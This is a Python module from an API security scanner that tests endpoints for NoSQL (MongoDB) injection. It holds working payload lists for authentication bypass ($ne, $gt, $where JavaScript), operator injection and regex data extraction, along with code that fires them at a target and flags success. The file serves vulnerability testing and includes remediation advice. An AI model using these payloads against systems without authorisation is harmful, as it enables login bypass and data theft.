"""
NoSQL Injection Detection Module.

Tests API endpoints for NoSQL injection vulnerabilities by:
- Injecting MongoDB operators in query parameters
- Testing JSON-based injection payloads
- Detecting authentication bypass via NoSQL injection
"""

import json
import time
from typing import Any

import requests

from ..models import AttackResult, AttackType, Endpoint, Parameter, Severity, Vulnerability


class NoSQLInjectionAttacker:
    """Detects NoSQL injection vulnerabilities in API endpoints.

    NoSQL injection attacks exploit the way NoSQL databases handle
    queries, particularly MongoDB's query operators.
    """

    # MongoDB operators for injection
    MONGO_OPERATORS = {
        '$gt': '',  # Greater than
        '$gte': '',  # Greater than or equal
        '$lt': '',  # Less than
        '$lte': '',  # Less than or equal
        '$ne': '',  # Not equal
        '$eq': '',  # Equal
        '$exists': True,  # Field exists
        '$regex': '.*',  # Regex match
        '$where': '1==1',  # JavaScript execution
        '$or': [],  # Logical OR
        '$and': [],  # Logical AND
        '$nor': [],  # Logical NOR
        '$in': [],  # In array
        '$nin': [],  # Not in array
        '$all': [],  # Matches all elements
        '$size': 1,  # Array size
        '$type': 'string',  # BSON type
        '$not': {},  # Logical NOT
        '$elemMatch': {},  # Element match
    }

    # Authentication bypass payloads
    AUTH_BYPASS_PAYLOADS = [
        # Basic authentication bypass
        {'$ne': ''},
        {'$gt': ''},
        {'$gt': ''},
        {'$ne': None},
        {'$exists': True},
        {'$regex': '.*'},

        # Combined operators
        {'$or': [{'username': 'admin'}, {'username': {'$ne': ''}}]},
        {'$or': [{'password': {'$ne': ''}}, {'password': {'$exists': False}}]},

        # JavaScript injection
        {'$where': '1==1'},
        {'$where': 'true'},
        {'$where': 'this.password == this.password'},
        {'$where': 'this.password.match(/.*/)'},

        # Type confusion
        {'$type': 'string'},
        {'$type': 2},  # BSON string type
    ]

    # Data extraction payloads
    DATA_EXTRACTION_PAYLOADS = [
        {'$regex': '^a'},
        {'$regex': '^b'},
        {'$regex': '^c'},
        {'$regex': '.*'},
        {'$gt': 'a'},
        {'$gt': '0'},
    ]

    # Parameter names often vulnerable to NoSQL injection
    VULNERABLE_PARAMS = [
        'username', 'user', 'email', 'login',
        'password', 'pass', 'pwd', 'passwd',
        'id', '_id', 'userId', 'user_id',
        'search', 'query', 'filter', 'find',
        'name', 'title', 'keyword'
    ]

    def __init__(self, target_url: str, timeout: int = 10):
        """Initialize the NoSQL injection detector.

        Args:
            target_url: Base URL of the target API
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sentinel/1.0 NoSQL Injection Scanner',
            'Accept': 'application/json'
        })

    def attack(
        self,
        endpoint: Endpoint,
        auth_token: str | None = None,
        parameters_to_test: list[str] | None = None
    ) -> list[AttackResult]:
        """Perform NoSQL injection attacks on an endpoint.

        Args:
            endpoint: The endpoint to attack
            auth_token: Authentication token
            parameters_to_test: Specific parameters to test

        Returns:
            List of attack results
        """
        # Handle API misuse (list passed as auth_token)
        if auth_token is not None and isinstance(auth_token, list):
            parameters_to_test = auth_token
            auth_token = None

        if auth_token:
            self.session.headers['Authorization'] = f"Bearer {auth_token}"

        results: list[AttackResult] = []

        # Find parameters to test
        target_params = self._get_target_params(endpoint, parameters_to_test)

        # Test each parameter
        for param in target_params:
            # Test authentication bypass payloads
            for payload in self.AUTH_BYPASS_PAYLOADS:
                result = self._test_payload(endpoint, param, payload, "Auth Bypass")
                if result:
                    results.append(result)

            # Test operator injection
            for operator, value in list(self.MONGO_OPERATORS.items())[:8]:
                payload = {operator: value if value != '' else ''}
                result = self._test_payload(endpoint, param, payload, f"Operator: {operator}")
                if result:
                    results.append(result)

            # Test data extraction payloads
            for payload in self.DATA_EXTRACTION_PAYLOADS[:3]:
                result = self._test_payload(endpoint, param, payload, "Data Extraction")
                if result:
                    results.append(result)

        # Test JSON body injection for POST/PUT
        if endpoint.method.value in ['POST', 'PUT', 'PATCH']:
            results.extend(self._test_body_injection(endpoint))

        return results

    def _get_target_params(
        self,
        endpoint: Endpoint,
        parameters_to_test: list[str] | None
    ) -> list[str]:
        """Get list of parameters to test."""
        params = set()

        for param in endpoint.parameters:
            # Skip if not in test list
            if parameters_to_test and param.name not in parameters_to_test:
                continue

            # Test all string parameters
            if param.param_type == 'string':
                params.add(param.name)

            # Test known vulnerable parameter names
            if param.name.lower() in [p.lower() for p in self.VULNERABLE_PARAMS]:
                params.add(param.name)

        # If no params found, try common vulnerable ones
        if not params:
            for param in endpoint.parameters:
                if any(vuln in param.name.lower() for vuln in ['user', 'pass', 'id', 'search', 'query']):
                    params.add(param.name)

        return list(params)

    def _test_payload(
        self,
        endpoint: Endpoint,
        param_name: str,
        payload: dict,
        attack_type: str
    ) -> AttackResult | None:
        """Test a specific NoSQL injection payload."""
        try:
            url = f"{self.target_url}{endpoint.path}"

            # Build request based on parameter location
            params = {}
            json_body = {}

            param_location = self._get_param_location(endpoint, param_name)

            if param_location == 'query':
                # Try both JSON string and object injection
                params[param_name] = json.dumps(payload)
            else:
                json_body[param_name] = payload

            # Add other required parameters
            for param in endpoint.parameters:
                if param.name != param_name:
                    default = self._get_default(param)
                    if param.location == 'query':
                        params[param.name] = default
                    else:
                        json_body[param.name] = default

            start_time = time.time()

            response = self.session.request(
                endpoint.method.value,
                url,
                params=params,
                json=json_body if json_body else None,
                timeout=self.timeout
            )

            duration_ms = (time.time() - start_time) * 1000

            # Check for successful injection
            is_vulnerable = self._is_vulnerable(response)

            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.NOSQL_INJECTION,
                success=is_vulnerable,
                payload=f"{param_name}={json.dumps(payload)} ({attack_type})",
                response_status=response.status_code,
                response_body=response.text[:500],
                duration_ms=duration_ms
            )

        except Exception as e:
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.NOSQL_INJECTION,
                success=False,
                payload=f"{param_name}={json.dumps(payload)}",
                error_message=str(e)
            )

    def _test_body_injection(self, endpoint: Endpoint) -> list[AttackResult]:
        """Test JSON body injection."""
        results = []

        # Build base body
        base_body = {}
        for param in endpoint.parameters:
            if param.location == 'body':
                base_body[param.name] = param.example if param.example else self._get_default(param)

        # Test with auth bypass payloads in body
        for payload in self.AUTH_BYPASS_PAYLOADS[:5]:
            for field in ['username', 'email', 'password', 'user', 'login']:
                if field in str(base_body).lower() or not base_body:
                    test_body = {**base_body}
                    test_body[field] = payload

                    try:
                        url = f"{self.target_url}{endpoint.path}"
                        start_time = time.time()

                        response = self.session.request(
                            endpoint.method.value,
                            url,
                            json=test_body,
                            timeout=self.timeout
                        )

                        duration_ms = (time.time() - start_time) * 1000

                        is_vulnerable = self._is_vulnerable(response)

                        results.append(AttackResult(
                            endpoint=endpoint,
                            attack_type=AttackType.NOSQL_INJECTION,
                            success=is_vulnerable,
                            payload=f"Body: {field}={json.dumps(payload)}",
                            response_status=response.status_code,
                            response_body=response.text[:500],
                            duration_ms=duration_ms
                        ))

                    except Exception:
                        pass

        return results

    def _get_param_location(self, endpoint: Endpoint, param_name: str) -> str:
        """Get the location of a parameter."""
        for param in endpoint.parameters:
            if param.name == param_name:
                return param.location
        return 'query'  # Default

    def _get_default(self, param: Parameter) -> Any:
        """Get default value for parameter type."""
        defaults = {
            'string': 'test',
            'integer': 1,
            'number': 1.0,
            'boolean': True,
            'array': [],
            'object': {}
        }
        return defaults.get(param.param_type, 'test')

    def _is_vulnerable(self, response: requests.Response) -> bool:
        """Check if response indicates NoSQL injection vulnerability."""
        # Success codes may indicate successful injection
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                data_str = json.dumps(data).lower()

                # Check for authentication success indicators
                auth_success = [
                    'token', 'jwt', 'session', 'authenticated',
                    'logged_in', 'login_success', 'user', 'profile'
                ]

                if any(indicator in data_str for indicator in auth_success):
                    # Verify it's not an error response
                    if 'error' not in data_str and 'fail' not in data_str:
                        return True

                # Data returned suggests successful query manipulation
                if isinstance(data, dict) and ('data' in data or '_id' in data or 'id' in data):
                    return True

                if isinstance(data, list) and len(data) > 0:
                    return True

            except Exception:
                pass

        return False

    def create_vulnerability(
        self,
        result: AttackResult,
        endpoint: Endpoint
    ) -> Vulnerability:
        """Create a Vulnerability object from an attack result."""
        return Vulnerability(
            endpoint=endpoint,
            attack_type=AttackType.NOSQL_INJECTION,
            severity=Severity.HIGH,
            title=f"NoSQL Injection in {endpoint.full_path}",
            description=(
                "NoSQL injection vulnerability detected. The API endpoint "
                "does not properly sanitize user input before using it in "
                "NoSQL database queries (likely MongoDB). Attackers can "
                "bypass authentication, extract data, or execute arbitrary "
                "JavaScript code on the database server."
            ),
            payload=result.payload or "",
            proof_of_concept=(
                f"Request: {endpoint.method.value} {endpoint.path}\n"
                f"Payload: {result.payload}\n"
                f"Response Status: {result.response_status}\n"
                f"Successfully injected NoSQL operators."
            ),
            recommendation=(
                "1. Sanitize and validate all user inputs\n"
                "2. Use parameterized queries or ORM methods\n"
                "3. Avoid passing user input directly to database queries\n"
                "4. Implement input allowlisting for query operators\n"
                "5. Disable $where operator if not needed\n"
                "6. Use least privilege database accounts\n"
                "7. Implement rate limiting to prevent brute force\n"
                "8. Log suspicious query patterns for monitoring"
            ),
            cwe_id="CWE-943",
            owasp_category="A03:2021 - Injection",
            response_evidence=result.response_body
        )
